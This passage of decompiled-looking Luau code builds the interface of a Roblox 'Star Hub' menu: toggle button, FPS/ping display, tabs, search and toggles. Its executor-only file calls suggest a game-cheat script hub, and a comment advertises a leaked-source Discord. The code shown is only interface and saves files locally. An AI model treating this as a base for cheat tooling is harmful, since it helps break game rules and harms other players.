		local func205 = func180
		local tbl104 = {}
		local numberSequence3 = NumberSequence.new
		local value175 = NumberSequenceKeypoint.new(0, 1)
		local value176 = NumberSequenceKeypoint.new(0.5, 0.55)
		local new3 = NumberSequenceKeypoint.new
		local tbl105 = { value175, value176 }

		do
			local values = table.pack(new3(1, 1))
			table.move(values, 1, values.n, 3, tbl105)
		end

		tbl104.Transparency = numberSequence3(tbl105)
		tbl104.Parent = Frame21
		func205("UIGradient", tbl104)

		local Frame22 = func180("Frame", {
			BackgroundTransparency = 1,
			Size = UDim2.fromOffset(0, 50),
			AutomaticSize = Enum.AutomaticSize.X,
			ZIndex = 3,
			Parent = TextButton3,
		})

		func180("UIPadding", { PaddingLeft = UDim.new(0, 9), PaddingRight = UDim.new(0, 20), Parent = Frame22 })

		func180("UIListLayout", {
			FillDirection = Enum.FillDirection.Horizontal,
			VerticalAlignment = Enum.VerticalAlignment.Center,
			Padding = UDim.new(0, 10),
			SortOrder = Enum.SortOrder.LayoutOrder,
			Parent = Frame22,
		})

		local value177 = func184(func180("Frame", {
			BackgroundTransparency = 1,
			Size = UDim2.fromOffset(34, 34),
			LayoutOrder = 1,
			ZIndex = 3,
			Parent = Frame22,
		}), tbl97.Icon or "star", 18, color2, { Anchor = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Z = 3 })

		if tbl97.Logo then
			value177.Image = tbl97.Logo
			value177.Size = UDim2.fromOffset(34, 34)
		end

		local Frame23 = func180("Frame", {
			BackgroundTransparency = 1,
			Size = UDim2.fromOffset(0, 34),
			AutomaticSize = Enum.AutomaticSize.X,
			LayoutOrder = 2,
			ZIndex = 3,
			Parent = Frame22,
		})

		local value178 = func183(Frame23, {
			Text = tbl97.Title or "Star Hub",
			Size = 16,
			Weight = fontWeight.Bold,
			Color = tbl90.inkText,
			Box = UDim2.fromOffset(0, 19),
			AutoX = true,
			Z = 3,
		})

		local value179 = func183(Frame23, {
			Text = "",
			Size = 11,
			Weight = fontWeight.Medium,
			Color = tbl90.inkDim,
			Position = UDim2.fromOffset(0, 19),
			Box = UDim2.fromOffset(0, 13),
			AutoX = true,
			Z = 3,
		})
		-- 𝖲𝗈𝗎𝗋𝖼𝖾 𝖫𝖾𝖺𝗄 (𝖲𝖫) | https://discord.gg/x7YbZeezpm

		value179.RichText = true
		local n6 = 0

		table.insert(tbl99, RunService2.RenderStepped:Connect(function(deltaTime)
			n6 += 1
			UIGradient.Rotation = (UIGradient.Rotation + deltaTime * 45) % 360
		end))

		local function func206(param158, flag218, flag219, flag220)
			return (flag220 and param158 <= flag218 or not flag220 and param158 >= flag218) and "#22C55E" or (flag220 and param158 <= flag219 or not flag220 and param158 >= flag219) and "#EAB308" or "#EF4444"
		end

		local function func207()
			local ok, result = pcall(function()
				return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
			end)

			if ok and result then
				return result
			end

			local ok2, result2 = pcall(function()
				return localPlayer2:GetNetworkPing()
			end)

			return ok2 and result2 * 2000 or 0
		end

		local flag221 = true

		tbl98._stopStats = function()
			flag221 = false
		end

		task.spawn(function()
			local now = os.clock()

			while flag221 do
				task.wait(0.5)
				local now2 = os.clock()
				local n7 = math.floor(n6 / math.max(now2 - now, 0.001) + 0.5)
				n6 = 0
				local n8 = math.floor(func207() + 0.5)
				local text = string.format("<font color=\"%s\">●</font> <font color=\"#F4F4F6\">%d</font> fps   <font color=\"%s\">●</font> <font color=\"#F4F4F6\">%d</font> ms", func206(n7, 55, 30, false), n7, func206(n8, 100, 200, true), n8)
				value159.Text = text
				value179.Text = text
				now = now2
			end
		end)

		TextButton3.MouseEnter:Connect(function()
			func185(TextButton3, 0.18, { Position = UDim2.fromOffset(0, -2) })
			func185(value171, 0.18, { Thickness = 2 })
		end)

		TextButton3.MouseLeave:Connect(function()
			func185(TextButton3, 0.18, { Position = UDim2.fromOffset(0, 0) })
			func185(value171, 0.18, { Thickness = 1.5 })
		end)

		local function func208(num59)
			local n7 = num59 - TextButton3.AbsolutePosition
			local n8 = math.max(TextButton3.AbsoluteSize.X, TextButton3.AbsoluteSize.Y) * 2.2

			local Frame24 = func180("Frame", {
				BackgroundColor3 = color2,
				BackgroundTransparency = 0.8,
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.fromOffset(n7.X, n7.Y),
				Size = UDim2.fromOffset(0, 0),
				ZIndex = 2,
				Parent = TextButton3,
			})

			func181(Frame24, 999)
			func185(Frame24, 0.55, { Size = UDim2.fromOffset(n8, n8), BackgroundTransparency = 1 })

			task.delay(0.6, function()
				Frame24:Destroy()
			end)
		end

		local str8 = (tbl97.Folder or "StarHub") .. "/toggle_button.txt"

		pcall(function()
			local match, value180, value181, value182 = readfile(str8):match("([%-%d%.]+),([%-%d%.]+),([%-%d%.]+),([%-%d%.]+)")

			if match then
				local value183 = Frame20
				local udim2 = UDim2.new
				local num60 = tonumber(match)
				local num61 = tonumber(value180)
				local func209 = tonumber
				value183.Position = udim2(num60, num61, tonumber(value181), func209(value182))
			end
		end)

		local flag222 = false
		local value184 = nil
		local value185 = nil
		local n7 = UserInputService2.TouchEnabled and not UserInputService2.KeyboardEnabled and 12 or 6

		table.insert(tbl99, func190(TextButton3, function(param159)
			local position3 = Frame20.Position
			flag222 = false
			value184 = position3
			value185 = param159
			func208(param159)
		end, function(num62)
			local n8 = num62 - value185

			if n7 < n8.Magnitude then
				flag222 = true
			end

			if flag222 then
				Frame20.Position = UDim2.new(value184.X.Scale, value184.X.Offset + n8.X, value184.Y.Scale, value184.Y.Offset + n8.Y)
			end
		end, function()
			if flag222 then
				local position3 = Frame20.Position

				pcall(function()
					if not isfolder(tbl97.Folder or "StarHub") then
						makefolder(tbl97.Folder or "StarHub")
					end

					writefile(str8, table.concat({ position3.X.Scale, position3.X.Offset, position3.Y.Scale, position3.Y.Offset }, ","))
				end)
			end
		end))

		TextButton3.Activated:Connect(function()
			if not flag222 then
				tbl98:Toggle()
			end
		end)

		local transparency = UIGradient.Transparency
		local numberSequence4 = NumberSequence.new
		local value186 = NumberSequenceKeypoint.new(0, 0)
		local value187 = NumberSequenceKeypoint.new(0.35, 0.6)
		local value188 = NumberSequenceKeypoint.new(0.65, 0.6)
		local new4 = NumberSequenceKeypoint.new
		local tbl106 = { value186, value187, value188 }

		do
			local values = table.pack(new4(1, 0))
			table.move(values, 1, values.n, 4, tbl106)
		end

		local flag223 = numberSequence4(tbl106)

		local function func210()
			local opened = tbl98.Opened
			UIGradient.Transparency = opened and flag223 or transparency
			func185(value178, 0.25, { TextColor3 = opened and tbl90.inkText or color(200, 200, 208) })
			func185(value179, 0.25, { TextColor3 = opened and tbl90.inkSub or tbl90.inkDim })
			value177.Rotation = 0
			func185(value177, 0.6, { Rotation = opened and 360 or -360 })
		end

		tbl98.Open = function()
			tbl98.Opened = true
			n4 += 1
			local flag224 = n4
			UIScale.Scale = func196()
			Frame2.Visible = true
			Frame2.Position = position + UDim2.fromOffset(0, 18)
			func185(Frame2, 0.4, { Position = position })
			Frame3.Visible = true
			Frame3.BackgroundTransparency = 0
			func185(Frame3, 0.35, { BackgroundTransparency = 1 })

			task.delay(0.36, function()
				if flag224 == n4 then
					Frame3.Visible = false
				end
			end)

			func210()
		end

		tbl98.Close = function()
			tbl98.Opened = false
			n4 += 1
			local flag225 = n4
			StarUI_Overlay:ClearAllChildren()
			Frame3.Visible = true
			func185(Frame3, 0.18, { BackgroundTransparency = 0 })
			func185(Frame2, 0.2, { Position = position + UDim2.fromOffset(0, 12) })

			task.delay(0.2, function()
				if flag225 ~= n4 then
					return
				end
				Frame2.Visible = false
				Frame2.Position = position
			end)

			func210()
		end

		tbl98.Toggle = function()
			if tbl98.Opened then
				tbl98:Close()
			else
				tbl98:Open()
			end
		end

		tbl98.Destroy = function()
			for _, item68 in ipairs(tbl99) do
				pcall(function()
					item68:Disconnect()
				end)
			end

			pcall(function()
				StarUI:Destroy()
			end)

			pcall(function()
				StarUI_Overlay:Destroy()
			end)

			pcall(function()
				StarUI_Toggle:Destroy()
			end)

			if tbl98._stopStats then
				tbl98._stopStats()
			end
		end

		func201("minus", 1, function()
			tbl98:Close()
		end)

		local size3 = nil
		local value189 = nil
		local maximize = nil

		maximize = func201("maximize", 2, function()
			flag216 = not flag216
			local imageLabel = maximize and maximize:FindFirstChildWhichIsA("ImageLabel")

			if imageLabel then
				imageLabel.Image = tbl91.Icon(flag216 and "minimize-2" or "maximize")
			end

			if flag216 then
				local value190 = position
				size3 = Frame2.Size
				value189 = value190
				UIScale.Scale = 1
				position = UDim2.fromScale(0.5, 0.5)
				func185(Frame2, 0.35, { Size = func197(), Position = position })
			else
				position = value189 or UDim2.fromScale(0.5, 0.5)
				func185(Frame2, 0.35, { Size = size3 or size, Position = position })

				task.delay(0.36, function()
					if not flag216 then
						UIScale.Scale = func196()
					end
				end)
			end
		end)

		func201("x", 3, function()
			tbl98:Close()
		end)

		func210()

		tbl98.Tag = function(param160, param161)
			local Frame24 = func180("Frame", {
				BackgroundColor3 = tbl90.inkRaised,
				Size = UDim2.fromOffset(0, 16),
				AutomaticSize = Enum.AutomaticSize.X,
				LayoutOrder = 2,
				ZIndex = 2,
				Parent = Frame8,
			})

			func181(Frame24, 8)
			func180("UIPadding", { PaddingLeft = UDim.new(0, 6), PaddingRight = UDim.new(0, 6), Parent = Frame24 })

			func183(Frame24, {
				Text = tostring(param161.Title or ""),
				Size = 11,
				Weight = fontWeight.SemiBold,
				Color = tbl90.inkSub,
				Box = UDim2.fromOffset(0, 16),
				AutoX = true,
				Z = 2,
			})

			return Frame24
		end

		local value191 = nil

		local function closePopup()
			if value191 then
				pcall(function()
					value191:Destroy()
				end)

				value191 = nil
			end
		end

		local function func211(param162, num63, num64)
			closePopup()

			local TextButton4 = func180("TextButton", {
				Text = "",
				AutoButtonColor = false,
				BackgroundTransparency = 1,
				Size = UDim2.fromScale(1, 1),
				Parent = StarUI_Overlay,
			})

			TextButton4.Activated:Connect(closePopup)
			value191 = TextButton4
			local scale = UIScale.Scale
			local absolutePosition = param162.AbsolutePosition
			local absoluteSize = param162.AbsoluteSize
			local absoluteSize2 = StarUI_Overlay.AbsoluteSize
			local n8 = num63 * scale
			local n9 = num64 * scale
			local n10 = math.clamp(absolutePosition.X + absoluteSize.X - n8, 8, absoluteSize2.X - n8 - 8)
			local n11 = absolutePosition.Y + absoluteSize.Y + 6

			if n11 + n9 > absoluteSize2.Y - 8 then
				n11 = math.max(8, absolutePosition.Y - n9 - 6)
			end

			local TextButton5 = func180("TextButton", {
				Text = "",
				AutoButtonColor = false,
				BackgroundColor3 = tbl90.card,
				Position = UDim2.fromOffset(n10, n11),
				Size = UDim2.fromOffset(num63, num64),
				Parent = TextButton4,
			})

			func180("UIScale", { Scale = scale, Parent = TextButton5 })
			func181(TextButton5, 12)
			func182(TextButton5, tbl90.cardLine)
			return TextButton5
		end

		tbl98.ClosePopup = closePopup
		local value192 = nil
		local value193 = nil

		local function func212(text, text2, flag226)
			value165.Text = text
			value164.Text = text2
			local value194 = value164
			value165.TextTransparency = 1
			value194.TextTransparency = 1
			value165.Position = UDim2.fromOffset(84, 27)
			func185(value165, 0.35, { TextTransparency = 0, Position = UDim2.fromOffset(72, 27) })
			func185(value164, 0.35, { TextTransparency = 0 })
			value163.Image = tbl91.Icon(flag226 or "house")
			UIScale2.Scale = 0.8
			func185(UIScale2, 0.35, { Scale = 1 })
		end

		local function func213(param163)
			local Frame24 = func180("Frame", {
				BackgroundColor3 = color2,
				BackgroundTransparency = 0.8,
				Size = UDim2.fromScale(1, 1),
				ZIndex = 4,
				Parent = param163,
			})

			func181(Frame24, 10)
			func185(Frame24, 1.4, { BackgroundTransparency = 1 })

			task.delay(1.45, function()
				Frame24:Destroy()
			end)
		end

		local function func214(param164)
			TextBox.Text = ""
			value193(param164.Tab)

			if param164.Section and param164.Section.Reveal then
				param164.Section.Reveal()
			end

			local row = param164.Row
			if not row then
				return
			end

			task.delay(0.08, function()
				local canvas = param164.Tab.Canvas
				local y = canvas.CanvasPosition.Y

				func185(canvas, 0.45, {
					CanvasPosition = Vector2.new(0, math.max(0, (row.AbsolutePosition.Y - canvas.AbsolutePosition.Y) / math.max(UIScale.Scale, 0.01) + y - 40)),
				})

				func213(row)
			end)
		end

		local function func215(str9)
			for _, child in ipairs(ScrollingFrame2:GetChildren()) do
				if child:IsA("GuiObject") then
					child:Destroy()
				end
			end

			local lowered8 = string.lower(str9)
			local list38 = {}

			for _, item69 in ipairs(list37) do
				local lowered9 = string.lower(item69.Title)
				local lowered10 = string.lower((item69.Tab.GroupTitle or "") .. " " .. item69.Tab.Title .. " " .. (item69.SectionTitle or ""))
				local n8 = lowered9:sub(1, #lowered8) == lowered8 and 0 or lowered9:find(lowered8, 1, true) and 1 or lowered10:find(lowered8, 1, true) and 2 or nil

				if n8 then
					list38[#list38 + 1] = { entry = item69, score = n8 }
				end
			end

			table.sort(list38, function(param165, param166)
				if param165.score ~= param166.score then
					return param165.score < param166.score
				end
				return param165.entry.Title < param166.entry.Title
			end)

			func212("Search", string.format("%d RESULT%s", #list38, #list38 == 1 and "" or "S"), "search")

			if #list38 == 0 then
				func183(ScrollingFrame2, {
					Text = "Nothing matches \"" .. str9 .. "\".",
					Size = 14,
					Color = tbl90.sub,
					Box = UDim2.new(1, 0, 0, 40),
					AlignX = Enum.TextXAlignment.Center,
				})

				return
			end

			for i = 1, math.min(#list38, 60) do
				local entry = list38[i].entry

				local TextButton4 = func180("TextButton", {
					Text = "",
					AutoButtonColor = false,
					BackgroundColor3 = tbl90.card,
					Size = UDim2.new(1, 0, 0, 54),
					LayoutOrder = i,
					Parent = ScrollingFrame2,
				})

				func181(TextButton4, 12)
				local value195 = func182(TextButton4, tbl90.cardLine)

				local Frame24 = func180("Frame", {
					BackgroundColor3 = color2,
					AnchorPoint = Vector2.new(0, 0.5),
					Position = UDim2.new(0, 12, 0.5, 0),
					Size = UDim2.fromOffset(30, 30),
					Parent = TextButton4,
				})

				func181(Frame24, 9)
				func184(Frame24, entry.Tab.Icon, 15, tbl90.ink, tbl93)

				func183(TextButton4, {
					Text = entry.Title,
					Size = 15,
					Weight = fontWeight.SemiBold,
					Position = UDim2.fromOffset(54, 9),
					Box = UDim2.new(1, -96, 0, 18),
				})

				local list39 = {}

				for _, item70 in ipairs({ entry.Tab.GroupTitle, entry.Tab.Title, entry.SectionTitle }) do
					if item70 and item70 ~= "" then
						list39[#list39 + 1] = item70
					end
				end

				func183(TextButton4, {
					Text = table.concat(list39, "  ›  "),
					Size = 12,
					Color = tbl90.sub,
					Position = UDim2.fromOffset(54, 28),
					Box = UDim2.new(1, -96, 0, 15),
				})

				func184(TextButton4, "chevron-right", 16, tbl90.dim, { Anchor = Vector2.new(1, 0.5), Position = UDim2.new(1, -14, 0.5, 0) })

				TextButton4.MouseEnter:Connect(function()
					func185(TextButton4, 0.15, { BackgroundColor3 = tbl90.hover })
					func185(value195, 0.15, { Color = tbl90.sub })
				end)

				TextButton4.MouseLeave:Connect(function()
					func185(TextButton4, 0.15, { BackgroundColor3 = tbl90.card })
					func185(value195, 0.15, { Color = tbl90.cardLine })
				end)

				TextButton4.Activated:Connect(function()
					func214(entry)
				end)
			end
		end

		local flag227 = false

		TextBox:GetPropertyChangedSignal("Text"):Connect(function()
			local flag228 = TextBox.Text:gsub("^%s+", ""):gsub("%s+$", "")
			TextButton.Visible = TextBox.Text ~= ""
			closePopup()

			if flag228 == "" then
				if not flag227 then
					return
				end
				flag227 = false
				ScrollingFrame2.Visible = false

				if value192 then
					value192.Page.Visible = true
					local func216 = func212
					local title = value192.Title
					local upper = string.upper
					local groupTitle = value192.GroupTitle or "Overview"
					local icon = value192.Icon
					func216(title, upper(groupTitle), icon)
				end

				return
			end

			flag227 = true

			if value192 then
				value192.Page.Visible = false
			end

			ScrollingFrame2.Visible = true
			ScrollingFrame2.CanvasPosition = Vector2.zero
			func215(flag228)
		end)

		value193 = function(obj36)
			if flag227 then
				TextBox.Text = ""
			end

			if value192 == obj36 then
				return
			end
			closePopup()

			if value192 then
				value192.Page.Visible = false
				value192:_paint(false)
			end

			value192 = obj36
			obj36.Page.Visible = true
			obj36:_paint(true)
			local func217 = func212
			local title = obj36.Title
			local upper = string.upper
			local groupTitle = obj36.GroupTitle or "Overview"
			local icon = obj36.Icon
			func217(title, upper(groupTitle), icon)
			Frame19.BackgroundTransparency = 0.1
			func185(Frame19, 0.3, { BackgroundTransparency = 1 })
			local canvas = obj36.Canvas
			canvas.Position = UDim2.fromOffset(0, 12)
			func185(canvas, 0.3, { Position = UDim2.fromOffset(0, 0) })
		end

		tbl98.SelectTab = function(param167, param168)
			local value196 = tbl98.Tabs[param168]

			if value196 then
				value193(value196)
			end
		end

		local value197 = nil

		local function func218(param169, param170, param171)
			local tbl107 = { Title = param170.Title or "Tab", GroupTitle = param171, Icon = param170.Icon, Window = tbl98 }

			local TextButton4 = func180("TextButton", {
				Text = "",
				AutoButtonColor = false,
				BackgroundColor3 = tbl90.inkRaised,
				BackgroundTransparency = 1,
				Size = UDim2.new(1, 0, 0, 38),
				LayoutOrder = func200(),
				ZIndex = 2,
				Parent = param169,
			})

			func181(TextButton4, 10)

			local Frame24 = func180("Frame", {
				BackgroundColor3 = tbl90.inkRaised,
				AnchorPoint = Vector2.new(0, 0.5),
				Position = UDim2.new(0, 5, 0.5, 0),
				Size = UDim2.fromOffset(26, 26),
				ZIndex = 2,
				Parent = TextButton4,
			})

			func181(Frame24, 8)
			local value198 = func184(Frame24, param170.Icon, 15, tbl90.inkSub, { Anchor = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Z = 2 })

			local value199 = func183(TextButton4, {
				Text = tbl107.Title,
				Size = 15,
				Weight = fontWeight.Medium,
				Color = tbl90.inkSub,
				Position = UDim2.fromOffset(40, 0),
				Box = UDim2.new(1, -46, 1, 0),
				Z = 2,
			})

			local flag229 = false

			tbl107._paint = function(param172, flag230)
				flag229 = flag230
				func185(TextButton4, 0.2, { BackgroundTransparency = flag230 and 0 or 1, BackgroundColor3 = flag230 and color2 or tbl90.inkRaised })
				func185(Frame24, 0.2, { BackgroundColor3 = flag230 and tbl90.ink or tbl90.inkRaised })
				func185(value198, 0.2, { ImageColor3 = flag230 and color2 or tbl90.inkSub })
				func185(value199, 0.2, { TextColor3 = flag230 and tbl90.ink or tbl90.inkSub })
				value199.FontFace = func179(flag230 and fontWeight.SemiBold or fontWeight.Medium)
			end

			TextButton4.MouseEnter:Connect(function()
				if flag229 then
					return
				end
				func185(TextButton4, 0.15, { BackgroundTransparency = 0.4 })
				func185(Frame24, 0.15, { BackgroundColor3 = tbl90.inkLine })
				func185(value199, 0.15, { TextColor3 = tbl90.inkText })
				func185(value198, 0.15, { ImageColor3 = tbl90.inkText })
			end)

			TextButton4.MouseLeave:Connect(function()
				if flag229 then
					return
				end
				func185(TextButton4, 0.15, { BackgroundTransparency = 1 })
				func185(Frame24, 0.15, { BackgroundColor3 = tbl90.inkRaised })
				func185(value199, 0.15, { TextColor3 = tbl90.inkSub })
				func185(value198, 0.15, { ImageColor3 = tbl90.inkSub })
			end)

			TextButton4.Activated:Connect(function()
				value193(tbl107)
			end)

			local Frame25 = func180("Frame", { BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), Visible = false, Parent = Frame17 })

			local ScrollingFrame3 = func180("ScrollingFrame", {
				Name = "ScrollingFrame",
				BackgroundTransparency = 1,
				Size = UDim2.fromScale(1, 1),
				CanvasSize = UDim2.new(),
				AutomaticCanvasSize = Enum.AutomaticSize.Y,
				ScrollBarThickness = 3,
				ScrollBarImageColor3 = tbl90.dim,
				ScrollingDirection = Enum.ScrollingDirection.Y,
				Parent = Frame25,
			})

			func180("UIPadding", {
				PaddingTop = UDim.new(0, 4),
				PaddingBottom = UDim.new(0, 22),
				PaddingLeft = UDim.new(0, 22),
				PaddingRight = UDim.new(0, 22),
				Parent = ScrollingFrame3,
			})

			func180("UIListLayout", { Padding = UDim.new(0, 14), SortOrder = Enum.SortOrder.LayoutOrder, Parent = ScrollingFrame3 })
			local layoutOrder = 0

			ScrollingFrame3.ChildAdded:Connect(function(child)
				if child:IsA("GuiObject") and child.LayoutOrder == 0 then
					layoutOrder += 1
					child.LayoutOrder = layoutOrder
				end
			end)

			tbl107.Page = Frame25
			tbl107.Canvas = ScrollingFrame3
			tbl107.Button = TextButton4
			tbl107.ContainerFrame = Frame25

			tbl107.Select = function()
				value193(tbl107)
			end

			tbl107.Section = function(param173, flag231)
				return value197(tbl107, flag231 or {})
			end

			tbl107.Paragraph = function(param174, param175)
				return value197(tbl107, {}):Paragraph(param175)
			end

			table.insert(tbl98.Tabs, tbl107)

			if not value192 then
				value193(tbl107)
			end

			return tbl107
		end

		tbl98.Tab = function(param176, flag232)
			return func218(ScrollingFrame, flag232 or {}, nil)
		end

		tbl98.Divider = function()
			local Frame24 = func180("Frame", {
				BackgroundTransparency = 1,
				Size = UDim2.new(1, 0, 0, 13),
				LayoutOrder = func200(),
				ZIndex = 2,
				Parent = ScrollingFrame,
			})

			func180("Frame", {
				BackgroundColor3 = tbl90.inkLine,
				AnchorPoint = Vector2.new(0, 0.5),
				Position = UDim2.new(0, 6, 0.5, 0),
				Size = UDim2.new(1, -12, 0, 1),
				ZIndex = 2,
				Parent = Frame24,
			})
		end

		tbl98.Section = function(param177, flag233)
			local tbl108 = flag233 or {}

			local Frame24 = func180("Frame", {
				BackgroundTransparency = 1,
				Size = UDim2.new(1, 0, 0, 0),
				AutomaticSize = Enum.AutomaticSize.Y,
				LayoutOrder = func200(),
				ZIndex = 2,
				Parent = ScrollingFrame,
			})

			func180("UIListLayout", { Padding = UDim.new(0, 3), SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame24 })

			local TextButton4 = func180("TextButton", {
				Text = "",
				AutoButtonColor = false,
				BackgroundTransparency = 1,
				Size = UDim2.new(1, 0, 0, 30),
				LayoutOrder = 0,
				ZIndex = 2,
				Parent = Frame24,
			})

			func184(TextButton4, tbl108.Icon, 13, tbl90.inkDim, { Position = UDim2.new(0, 11, 0.5, 3), Z = 2 })

			func183(TextButton4, {
				Text = string.upper(tbl108.Title or ""),
				Size = 11,
				Weight = fontWeight.Bold,
				Color = tbl90.inkDim,
				Position = UDim2.fromOffset(tbl108.Icon and 30 or 12, 5),
				Box = UDim2.new(1, -56, 1, -5),
				Z = 2,
			})

			local value200 = func184(TextButton4, "chevron-down", 14, tbl90.inkDim, { Anchor = Vector2.new(1, 0.5), Position = UDim2.new(1, -8, 0.5, 3), Z = 2 })

			local Frame25 = func180("Frame", {
				BackgroundTransparency = 1,
				Size = UDim2.new(1, 0, 0, 0),
				AutomaticSize = Enum.AutomaticSize.Y,
				LayoutOrder = 1,
				ZIndex = 2,
				Parent = Frame24,
			})

			func180("UIListLayout", { Padding = UDim.new(0, 3), SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame25 })
			local visible = tbl108.Opened ~= false

			local function func219()
				Frame25.Visible = visible
				func185(value200, 0.2, { Rotation = visible and 0 or -90 })
			end

			func219()

			TextButton4.Activated:Connect(function()
				visible = not visible
				func219()
			end)

			return { Tab = function(param178, flag234)
				return func218(Frame25, flag234 or {}, tbl108.Title)
			end }
		end

		local function func220(param179, param180)
			if param180 then
				tbl98.Flags[param180] = param179
			end

			return param179
		end

		value197 = function(param181, param182)
			local tbl109 = { Tab = param181 }

			local Frame24 = func180("Frame", {
				BackgroundColor3 = tbl90.card,
				Size = UDim2.new(1, 0, 0, 0),
				AutomaticSize = Enum.AutomaticSize.Y,
				Parent = param181.Canvas,
			})

			func181(Frame24, 14)
			func182(Frame24, tbl90.cardLine)
			func180("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame24 })

			local Frame25 = func180("Frame", {
				BackgroundTransparency = 1,
				Size = UDim2.new(1, 0, 0, 0),
				AutomaticSize = Enum.AutomaticSize.Y,
				LayoutOrder = 2,
				Parent = Frame24,
			})

			func180("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame25 })
			func180("UIPadding", { PaddingBottom = UDim.new(0, 6), PaddingTop = UDim.new(0, param182.Title and 0 or 6), Parent = Frame25 })
			local n8 = 0

			if param182.Title then
				local TextButton4 = func180("TextButton", {
					Text = "",
					AutoButtonColor = false,
					BackgroundTransparency = 1,
					Size = UDim2.new(1, 0, 0, 52),
					LayoutOrder = 1,
					Parent = Frame24,
				})

				local Frame26 = func180("Frame", {
					BackgroundColor3 = color2,
					AnchorPoint = Vector2.new(0, 0.5),
					Position = UDim2.new(0, 16, 0.5, 0),
					Size = UDim2.fromOffset(30, 30),
					Parent = TextButton4,
				})

				func181(Frame26, 9)
				func184(Frame26, param182.Icon, 15, tbl90.ink, tbl93)

				func183(TextButton4, {
					Text = param182.Title,
					Size = 16,
					Weight = fontWeight.Bold,
					Position = UDim2.fromOffset(56, 0),
					Box = UDim2.new(1, -150, 1, 0),
				})

				local Frame27 = func180("Frame", {
					BackgroundColor3 = tbl90.field,
					AnchorPoint = Vector2.new(1, 0.5),
					Position = UDim2.new(1, -48, 0.5, 0),
					Size = UDim2.fromOffset(0, 22),
					AutomaticSize = Enum.AutomaticSize.X,
					Parent = TextButton4,
				})

				func181(Frame27, 11)
				func182(Frame27, tbl90.cardLine)
				func180("UIPadding", { PaddingLeft = UDim.new(0, 9), PaddingRight = UDim.new(0, 9), Parent = Frame27 })

				tbl109.CountLabel = func183(Frame27, {
					Text = "0",
					Size = 12,
					Weight = fontWeight.SemiBold,
					Color = tbl90.sub,
					Box = UDim2.fromOffset(0, 22),
					AutoX = true,
				})

				local Frame28 = func180("Frame", {
					BackgroundColor3 = tbl90.field,
					AnchorPoint = Vector2.new(1, 0.5),
					Position = UDim2.new(1, -14, 0.5, 0),
					Size = UDim2.fromOffset(26, 26),
					Parent = TextButton4,
				})

				func181(Frame28, 13)
				local value201 = func184(Frame28, "chevron-down", 14, tbl90.sub, tbl93)
				local visible = param182.Opened ~= false

				local function func221()
					Frame25.Visible = visible
					func185(value201, 0.2, { Rotation = visible and 0 or -90 })
				end

				func221()

				TextButton4.Activated:Connect(function()
					visible = not visible
					func221()
				end)

				tbl109.Reveal = function()
					if not visible then
						visible = true
						func221()
					end
				end

				n8 = 1
			end

			tbl109.Frame = Frame24
			tbl109.Body = Frame25
			local n9 = 0

			local function func222(param183)
				n8 += 1
				n9 += 1

				if tbl109.CountLabel then
					tbl109.CountLabel.Text = tostring(n9)
				end

				local Frame26 = func180("Frame", { BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, param183), LayoutOrder = n8, Parent = Frame25 })

				if n8 > 1 then
					func180("Frame", {
						BackgroundColor3 = tbl90.divider,
						Position = UDim2.fromOffset(16, 0),
						Size = UDim2.new(1, -32, 0, 1),
						Parent = Frame26,
					})
				end

				return Frame26
			end

			local function func223(param184)
				local Frame26 = func180("Frame", {
					BackgroundColor3 = tbl90.hover,
					BackgroundTransparency = 1,
					Position = UDim2.fromOffset(8, 3),
					Size = UDim2.new(1, -16, 1, -6),
					Parent = param184,
				})

				func181(Frame26, 10)

				local TextButton4 = func180("TextButton", {
					Text = "",
					AutoButtonColor = false,
					BackgroundTransparency = 1,
					Size = UDim2.fromScale(1, 1),
					ZIndex = 3,
					Parent = param184,
				})

				TextButton4.MouseEnter:Connect(function()
					func185(Frame26, 0.15, { BackgroundTransparency = 0 })
				end)

				TextButton4.MouseLeave:Connect(function()
					func185(Frame26, 0.15, { BackgroundTransparency = 1 })
				end)

				return TextButton4, Frame26
			end

			local function func224(param185, flag235, flag236)
				if flag235 and flag235 ~= "" then
					list37[#list37 + 1] = { Title = flag235, Tab = param181, Section = tbl109, SectionTitle = param182.Title, Row = param185 }
				end

				return func183(param185, {
					Text = flag235 or "",
					Size = 15,
					Weight = fontWeight.Medium,
					Position = UDim2.fromOffset(18, 0),
					Box = UDim2.new(1, -18 - (flag236 or 18), 1, 0),
				})
			end

			local function func225(param186, part21)
				local obj37 = func180(part21.Class or "TextButton", {
					BackgroundColor3 = tbl90.field,
					AnchorPoint = part21.Anchor or Vector2.new(1, 0.5),
					Position = part21.Position or UDim2.new(1, -16, 0.5, 0),
					Size = part21.Size or UDim2.fromOffset(0, 30),
					AutomaticSize = part21.Auto or Enum.AutomaticSize.X,
					Parent = param186,
				})

				if obj37:IsA("TextButton") then
					obj37.Text = ""
					obj37.AutoButtonColor = false
				end

				func181(obj37, part21.Radius or 9)
				func182(obj37, tbl90.cardLine)
				return obj37
			end

			tbl109.Toggle = function(param187, param188)
				local value202 = func222(48)
				local value203 = func223(value202)
				local value204 = func224(value202, param188.Title, 74)

				local Frame26 = func180("Frame", {
					BackgroundColor3 = tbl90.track,
					AnchorPoint = Vector2.new(1, 0.5),
					Position = UDim2.new(1, -18, 0.5, 0),
					Size = UDim2.fromOffset(44, 24),
					ZIndex = 2,
					Parent = value202,
				})

				func181(Frame26, 12)

				local Frame27 = func180("Frame", {
					BackgroundColor3 = tbl90.sub,
					AnchorPoint = Vector2.new(0, 0.5),
					Position = UDim2.new(0, 3, 0.5, 0),
					Size = UDim2.fromOffset(18, 18),
					ZIndex = 2,
					Parent = Frame26,
				})

				func181(Frame27, 9)
				local value205 = func182(Frame27, tbl90.cardLine)
				local tbl110 = { Type = "Toggle", Flag = param188.Flag, Value = param188.Value == true, ElementFrame = value202, Locked = false }

				local function func226(param189)
					local value206 = tbl110.Value
					local tbl111 = {}
					tbl111[Frame26] = { BackgroundColor3 = value206 and tbl90.accent or tbl90.track }

					tbl111[Frame27] = {
						BackgroundColor3 = value206 and tbl90.ink or tbl90.sub,
